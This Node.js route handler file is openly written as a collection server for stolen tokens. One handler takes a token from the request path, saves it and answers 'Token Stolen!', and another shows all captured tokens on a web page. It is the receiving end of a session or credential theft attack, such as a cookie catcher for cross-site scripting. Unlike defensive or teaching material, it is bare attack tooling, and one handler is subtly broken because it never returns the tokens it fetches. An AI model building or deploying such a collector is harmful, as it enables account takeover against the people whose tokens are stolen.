const getTokens = require("../services/getTokens");
const saveToken = require("../services/saveToken");

const responseBuilder = (h, status='success', code=200, message, data={}) => {
    const response = h.response({
        status: status,
        message: message,
        data: data,
    }).code(code);

    return response;
}


/*
    GET Root Handler
    1) Return Root Message
*/
const getRootHandler = async (request, h) => {
    // 1)
    return responseBuilder(h, 'success', 200, 'Root Reached!')
};


/*
    GET Tokens Page Handler
    1) Get Tokens from Database
    2) Display Tokens Page
*/
const getTokensPageHandler = async (request, h) => {

    // 1)
    const data = {

    }

    const tokens = await getTokens();
    data.tokens = tokens;

    // 2)
    return h.view('tokens.ejs', data);
}


/*
    SAVE TOKEN Handler
    1) Get Token
    2) Save Token
    3) Build Response
*/
const saveTokenHandler = async (request, h) => {
    // 1)
    const { token } = request.params;

    // 2)
    await saveToken(token);

    // 3)
    return responseBuilder(h, "success", 201, "Token Stolen!");

}


/*
    GET All Tokens Handler
    1) Get All Token
    2) SBuild Response
*/
const getAllTokensHandler = async (request, h) => {
    // 1)
    const tokens = await getTokens();

    // 2)
    return responseBuilder(h, "success", 200, "Tokens Retrieved Successfully!");
}

module.exports = {
    getRootHandler, getTokensPageHandler, saveTokenHandler,
    getAllTokensHandler
}